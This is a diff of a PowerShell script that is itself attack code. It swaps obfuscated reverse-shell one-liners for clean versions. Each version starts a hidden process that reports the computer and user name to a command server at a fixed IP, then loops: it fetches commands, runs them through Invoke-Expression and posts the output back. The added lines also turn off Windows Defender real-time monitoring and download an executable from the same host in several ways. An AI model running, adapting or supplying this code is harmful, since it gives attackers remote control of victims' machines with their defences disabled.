@@ -1,5 +1,24 @@
-StA'rT-prO'CESS $PSHOME\powershell.exe -ArgUMeNTlIST {$676=$('573b60' -rEplaCe '[(5|\?)(7|\?)(3|\?)(b|\?)\d(0|\?)]{6}','31.166.215.197:45001');$359=$('71e88315' -rePlaCe '[\d\d\w\d83\d]{7}[\d]{1}','bc510bb7-6cdbae3b-609bdcb1');$3170=$('d55c43b' -rEplacE '[d(5|\?)(5|\?)c]{4}[\d\d\w]{3}','http://');$8fa=invO'kE-ReSTMETho'D -USEBasIcPaRsInG -uRI $3170$676/bc510bb7/$env:cOMPUTeRnAme/$env:USeRNAMe -HEADers @{"Authorization"=$359};for (;;){$b6669b=(invO'kE-ReSTMETho'D -USEBasIcPaRsInG -uRI $3170$676/6cdbae3b -HEADers @{"Authorization"=$359});if ($b6669b -NE ('None')) {$2=i'NvOkE-ExPRessiOn' $b6669b -ERRoraCtion st'OP' -eRRORvAriabLe 13e25;$2=o'Ut-stRINg' -iNPuTOBjeCt $2;$b81=invO'kE-ReSTMETho'D -uRI $3170$676/609bdcb1 -meTHOd POST -HEADers @{"Authorization"=$359} -body ($13e25+$2)} S'lee'p 0.8}} -WiNDOWstYLE h'IddEN'
+Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='f0efbf5c-7b9c693b-d71a9183';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/f0efbf5c/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/7b9c693b -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/d71a9183 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden
 
-S'TARt-pRoCesS' $PSHOME\powershell.exe -ARGuMEnTlISt {$8db='3'+'1.166.2'+'1'+'5.197'+':4500'+'1';$0a1f=$('8cbb53b6-f542'+'5aea-043'+'2279e');$51189=$('204633' -RepLaCE '[\d0\d\d(3|\?)\d]{6}','http://');$d8=i'Rm' -uSebAsiCparsing -uRi $51189$8db/8cbb53b6/$env:COMpUTeRnAME/$env:UsErnAme -heaDERs @{"Authorization"=$0a1f};for (;;){$0a1=(i'Rm' -uSebAsiCparsing -uRi $51189$8db/f5425aea -heaDERs @{"Authorization"=$0a1f});if ($0a1 -NE ('None')) {$15820=i'Ex' $0a1 -ERrOrACtIon s'Top' -eRrORVArIaBlE 1;$15820=oUt-'StrING' -INpuTobJECT $15820;$ded=i'Rm' -uRi $51189$8db/0432279e -methoD POST -heaDERs @{"Authorization"=$0a1f} -BOdY ($1+$15820)} S'lEEP' 0.8}} -WInDowSTYLe H'idDen'
+Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='c2e3e1ce-63face78-66c32997';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/c2e3e1ce/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/63face78 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/66c32997 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden
 
-S'tarT-PROcESS' $PSHOME\powershell.exe -aRGUmeNtLiST {$9=$('c8a9' -REpLAcE '[c8(a|\?)(9|\?)]{4}','31.166.215.197:45001');$94663=$('ed7b4860-9bd8f62e-848'+'4a71'+'0');$0='http://';$39=IN'VokE-REstMetho'd -USeBaSIcpArSiNg -urI $0$9/ed7b4860/$env:cOmpUternAMe/$env:USeRnaME -HEadErs @{"Authorization"=$94663};for (;;){$301=(IN'VokE-REstMetho'd -USeBaSIcpArSiNg -urI $0$9/9bd8f62e -HEadErs @{"Authorization"=$94663});if ($301 -Ne ('Non'+'e')) {$071=iNvOk'E-EXprESSio'n $301 -ERRORAction sT'OP' -errORVARiABLE 5;$071=oUt-'stRi'ng -InPutObJEcT $071;$96=IN'VokE-REstMetho'd -urI $0$9/8484a710 -METHOd POST -HEadErs @{"Authorization"=$94663} -BODy ($5+$071)} SlE'EP' 0.8}} -WinDOWStyLE H'ID'den
+Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='78a942f8-30d8ee53-67062fab';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/78a942f8/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/30d8ee53 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/67062fab -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden
+
+
+New-ItemProperty -Path "HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 0 –Force
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+
+$URL = "http://31.166.215.197:45005/time.exe"
+
+$Path=”C:\Files\MyFile.txt”
+Invoke-WebRequest -URI $URL -OutFile $Path
+(New-Object System.Net.WebClient).DownloadFile ($URL, $Path)
+Start-BitsTransfer -Source $URL -Destination $Path
+
+
+wget 31.166.215.197:45005/time1.exe
+curl 31.166.215.197:45005/time.exe
+Invoke-WebRequest http://31.166.215.197:45005/time.exe -O time.exe
